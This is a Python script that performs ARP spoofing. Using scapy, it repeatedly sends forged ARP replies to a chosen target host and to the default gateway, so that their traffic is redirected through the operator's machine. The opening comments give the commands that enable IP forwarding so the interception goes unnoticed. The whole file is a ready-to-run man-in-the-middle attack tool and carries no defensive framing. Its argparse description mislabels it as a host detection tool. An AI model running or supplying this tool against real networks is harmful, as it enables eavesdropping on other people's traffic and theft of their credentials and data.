# We need to execute this command on our linux machine, otherwise if there is overload of communication our machine can crash
# sudo iptables --policy FORWARD ACCEPT
# sudo sysctl -w net.ipv4.ip_forward=1
# or we can modify the file "/proc/sys/net/ipv4/ip_forward" and set it to 1 (echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward)

from termcolor import colored
import scapy.all as scapy
import netifaces
import argparse
import signal
import time
import sys

def def_handler(sig, frame):
    color_helper("Forcibly Exiting Program", "Error")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser("Tool to detect hosts in a network using ARP")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Specify the host to spoof (Ex: 192.168.1.1)")
    return parser.parse_args().ip_address

def color_helper(text, type):
    if type.lower() == "error":
        print(f"{colored('[!', 'yellow')}{colored(' Spoofer Error ', 'red')}{colored('>]', 'yellow')} {colored(text, 'yellow')}")

    elif type.lower() == "info":
        print(f"{colored('[!', 'yellow')}{colored(' Spoofer Info ', 'cyan')}{colored('>]', 'yellow')} {colored(text, 'cyan')}")

    elif type.lower() == "detected":
        print(f"{colored('[!', 'red')}{colored(' Spoofer Detect ', 'yellow')}{colored('>]', 'red')} {colored(text, 'red')}")

def get_mac_address(interface_name):
    try:
        with open(f"/sys/class/net/{interface_name}/address", "r") as file:
            mac = file.read().strip()
            return mac
    except FileNotFoundError:
        color_helper(f"Could not get MAC address for interface {interface_name}", "error")
        sys.exit()

def get_gateway_ip():
    try:
        gateways = netifaces.gateways()
        return gateways['default'][netifaces.AF_INET][0]
    except:
        color_helper("Could not detect gateway IP", "error")
        sys.exit(1)

def spoof(ip_address, spoof_ip, own_mac):
    # op=1 == spolicitud
    # op=2 == respuesta
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc=own_mac)
    scapy.send(arp_packet, verbose=False)

def main():
    ip_address = get_arguments()
    interface = scapy.conf.iface
    own_mac = get_mac_address(interface)
    gateway_ip = get_gateway_ip()

    color_helper(f"Using interface: {interface}", "info")
    color_helper(f"Own MAC: {own_mac}", "info")
    color_helper(f"Gateway IP detected: {gateway_ip}", "info")

    while True:
        color_helper(f"Sending spoof ARP packet - dest: {ip_address}", "info")
        spoof(ip_address, gateway_ip, own_mac) # Spoof the router to set our mac for the given ip
        color_helper(f"Sending spoof ARP packet - dest: {gateway_ip}", "info")
        spoof(gateway_ip, ip_address, own_mac) # Spoof the device to set our mac for the router
        time.sleep(2)

if __name__ == "__main__":
    main()